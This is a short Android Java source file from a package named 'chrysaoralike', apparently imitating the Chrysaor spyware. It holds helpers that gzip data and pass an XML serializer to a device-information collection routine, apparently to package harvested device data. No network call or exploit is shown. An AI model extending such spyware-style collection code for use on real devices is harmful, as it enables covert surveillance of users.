package com.android.chrysaoralike;

import android.content.Context;
import android.util.Xml;

import org.xmlpull.v1.XmlSerializer;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.zip.GZIPOutputStream;

public class PackingInformationIntoXml {

    public static ByteArrayOutputStream Gzip(byte[] p0){
        ByteArrayOutputStream uByteArrayOutput = new ByteArrayOutputStream();
        try {
            GZIPOutputStream GzipOutput = new GZIPOutputStream(uByteArrayOutput);
            GzipOutput.write(p0);
            GzipOutput.close();
        } catch (Throwable e){}
        return uByteArrayOutput;
    }
    public static void xml_maker(Context context, StringBuilder str){
        XmlSerializer xml = Xml.newSerializer();
        GetDeviceInformation.collectingData(context, xml, str);
    }
}
